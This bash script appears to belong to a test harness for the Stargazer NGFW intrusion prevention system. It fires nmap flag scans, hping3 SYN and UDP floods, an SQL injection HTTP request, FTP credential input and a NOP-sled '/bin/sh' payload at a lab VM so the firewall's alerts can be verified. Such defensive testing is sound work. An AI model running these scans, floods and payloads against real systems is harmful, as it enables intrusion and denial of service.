#!/bin/bash
# =============================================================================
# Stargazer NGFW — Attack simulation from HOST (real nmap / hping3 / nc)
# =============================================================================
#
# Topology (test_net_setup.sh):
#   Host (10.0.1.1, br-wan)  ── attacker, real pentest tools
#        │ WAN
#   Stargazer eth1(WAN 10.0.1.2) → eth0(LAN 192.168.99.99)
#        │ LAN
#   LAN VM (192.168.99.100)  ── target
#
# Traffic host → LAN VM is FORWARDED through the firewall in the eth1→eth0
# direction — exactly what an IPS policy "srcintf eth1, dstintf eth0,
# ips-profile default" inspects. Uses the host's real, current tools so the
# report shows authentic attack traffic.
#
# Prerequisites:
#   1. sudo ./scripts/test_net_setup.sh up   (bridges/TAPs + host route)
#   2. Stargazer: set eth1 WAN IP = 10.0.1.2/24, LAN eth0 = 192.168.99.99/24
#   3. Stargazer: enable IPS + policy eth1→eth0 ips-profile=default
#   4. LAN VM booted (192.168.99.100)
#
# Usage:  sudo ./scripts/attack-host.sh [all|null-scan|xmas-scan|fin-scan|
#                                        port-scan|syn-flood|udp-flood|
#                                        web-sqli|ftp-brute|shellcode]
# =============================================================================

set -uo pipefail

TARGET="${TARGET:-192.168.99.100}"   # LAN VM (qua firewall)
GW="${GW:-10.0.1.2}"                 # Stargazer WAN IP
SCEN="${1:-all}"

c_hdr()  { printf "\n\033[1;36m=== %s ===\033[0m\n" "$*"; }
c_note() { printf "  \033[0;33m%s\033[0m\n" "$*"; }
c_run()  { printf "  \033[0;32m$ %s\033[0m\n" "$*"; }

require_root() {
    [ "$(id -u)" -eq 0 ] || { echo "Cần chạy bằng sudo (raw socket cho nmap/hping3)"; exit 1; }
}

preflight() {
    local fail=0
    for t in nmap hping3 nc; do
        command -v "$t" >/dev/null 2>&1 || { echo "MISSING tool: $t (apt install $t)"; fail=1; }
    done
    if ! ip route get "$TARGET" >/dev/null 2>&1; then
        echo "Không có route tới $TARGET — chạy: sudo ./scripts/test_net_setup.sh up"
        fail=1
    fi
    [ $fail -eq 0 ] || exit 1
    echo "[attack-host] attacker=$(hostname) → target=$TARGET (qua firewall $GW)"
    c_note "Trên Stargazer mở: execute diagnose ips alerts  (hoặc tail /etc/stargazer/logs/ipsd.log)"
}

# ── pkt_forward.ko anomaly screen: malformed TCP flag scans ───────────────
null_scan() {
    c_hdr "NULL scan — không cờ TCP nào (pkt_forward.ko is_tcp_anomaly)"
    c_note "Mong đợi: kernel drop ở FORWARD hook + có thể alert ET SCAN"
    c_run "nmap -sN -p 22,80,443 $TARGET"
    nmap -sN -p 22,80,443 "$TARGET" 2>/dev/null | grep -E 'PORT|open|closed|filtered|Nmap done'
}

xmas_scan() {
    c_hdr "XMAS scan — cờ FIN+PSH+URG (pkt_forward.ko)"
    c_run "nmap -sX -p 22,80,443 $TARGET"
    nmap -sX -p 22,80,443 "$TARGET" 2>/dev/null | grep -E 'PORT|open|closed|filtered|Nmap done'
}

fin_scan() {
    c_hdr "FIN scan — chỉ cờ FIN, không ACK (pkt_forward.ko)"
    c_run "nmap -sF -p 22,80,443 $TARGET"
    nmap -sF -p 22,80,443 "$TARGET" 2>/dev/null | grep -E 'PORT|open|closed|filtered|Nmap done'
}

# ── L1 flow-stat rules ────────────────────────────────────────────────────
port_scan() {
    c_hdr "Port scan SYN — nhiều port, ít gói/flow (L1 port-scan rule)"
    c_note "Mong đợi: L1 rule (proto TCP, chỉ SYN, handshake không hoàn tất)"
    c_run "nmap -sS -p 1-1000 $TARGET"
    nmap -sS -p 1-1000 "$TARGET" 2>/dev/null | grep -E 'open|filtered|Nmap done'
}

syn_flood() {
    c_hdr "SYN flood — hping3 (L1 SYN-flood rule: syn_count >> ack_count)"
    c_note "Chạy 5 giây..."
    c_run "hping3 --syn --flood -p 80 $TARGET"
    timeout 5 hping3 --syn --flood -p 80 "$TARGET" >/dev/null 2>&1 || true
    c_note "→ Xong. Kiểm alert SYN flood trên Stargazer."
}

udp_flood() {
    c_hdr "UDP flood — hping3 (anomaly/ML)"
    c_run "hping3 --udp --flood -p 53 $TARGET"
    timeout 5 hping3 --udp --flood -p 53 "$TARGET" >/dev/null 2>&1 || true
    c_note "→ Xong."
}

# ── L2 payload signature (AC engine) ──────────────────────────────────────
web_sqli() {
    c_hdr "Web SQLi — payload chứa UNION SELECT (L2 content signature)"
    c_note "Cần ruleset có web rule; với scan ruleset có thể không match — minh hoạ cơ chế"
    c_run "printf 'GET /?id=1 UNION SELECT ... HTTP/1.0' | nc $TARGET 80"
    printf 'GET /index.php?id=1+UNION+SELECT+password+FROM+users HTTP/1.0\r\nHost: %s\r\n\r\n' \
        "$TARGET" | timeout 3 nc "$TARGET" 80 2>/dev/null | head -3 || \
        c_note "(timeout/refused — không có HTTP server ở target, packet vẫn qua firewall để soi)"
}

ftp_brute() {
    c_hdr "FTP payload — USER/PASS (L2 ET FTP signature)"
    c_run "printf 'USER root\\r\\nPASS test123\\r\\n' | nc $TARGET 21"
    printf 'USER root\r\nPASS test123\r\n' | timeout 3 nc "$TARGET" 21 2>/dev/null | head -2 || \
        c_note "(không có FTP server — packet vẫn được firewall soi)"
}

shellcode() {
    c_hdr "Shellcode-like payload trên port lạ (L2 / ML)"
    c_run "printf '<NOP-sled + payload>' | nc $TARGET 9999"
    printf '\x90\x90\x90\x90\x90\x90\x90\x90/bin/sh\x00TESTPAYLOAD' | \
        timeout 3 nc "$TARGET" 9999 2>/dev/null | head -2 || \
        c_note "(packet đã đi qua firewall để inspect)"
}

require_root
preflight

case "$SCEN" in
    null-scan)  null_scan ;;
    xmas-scan)  xmas_scan ;;
    fin-scan)   fin_scan ;;
    port-scan)  port_scan ;;
    syn-flood)  syn_flood ;;
    udp-flood)  udp_flood ;;
    web-sqli)   web_sqli ;;
    ftp-brute)  ftp_brute ;;
    shellcode)  shellcode ;;
    all)
        null_scan; xmas_scan; fin_scan
        port_scan; syn_flood; udp_flood
        web_sqli; ftp_brute; shellcode
        ;;
    *)
        echo "Kịch bản không hợp lệ: $SCEN"
        echo "Dùng: $0 [all|null-scan|xmas-scan|fin-scan|port-scan|syn-flood|udp-flood|web-sqli|ftp-brute|shellcode]"
        exit 1
        ;;
esac

c_hdr "Hoàn tất"
c_note "Xác minh phát hiện trên Stargazer:"
c_note "  execute diagnose ips status     # ipsd_running + alert count"
c_note "  execute diagnose ips alerts 30  # 30 alert gần nhất"
